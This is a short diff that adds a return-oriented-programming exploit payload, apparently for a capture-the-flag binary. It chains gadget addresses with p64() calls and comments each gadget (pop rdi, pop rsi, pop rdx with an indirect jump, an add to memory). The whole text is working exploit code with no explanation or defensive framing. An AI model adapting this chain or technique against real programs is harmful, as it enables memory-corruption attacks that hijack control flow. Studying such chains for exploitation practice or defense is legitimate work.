@@ -1,0 +1,13 @@
+payload = p64(0x401e62)
+#0x0000000000001e62: pop rbx; pop r12; pop r13; pop rbp; ret; 
+payload += p64(0x4017d1)+p64(0x0)+p64(0x0)+p64(0x4052bd)+p64(0x401257)
+# 0x401257: add eax, 0x3e2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
+payload += p64(0x4017d3)
+# 0x00000000000017d3: pop rdi; ret; 
+payload += p64(0x100001)+p64(0x4017d1)
+# 0x00000000000017d1: pop rsi; pop r15; ret; 
+payload += p64(0x40521a)+p64(0x0)+p64(0x402071)
+# 0x0000000000002071: pop rdx; jmp qword ptr [rsi + 0x66]; 
+payload += p64(0x100003)
+# 0x00000000000017d1: pop rsi; pop r15; ret; 
+payload += p64(0x100002)+p64(0x0)+p64(0x401331)
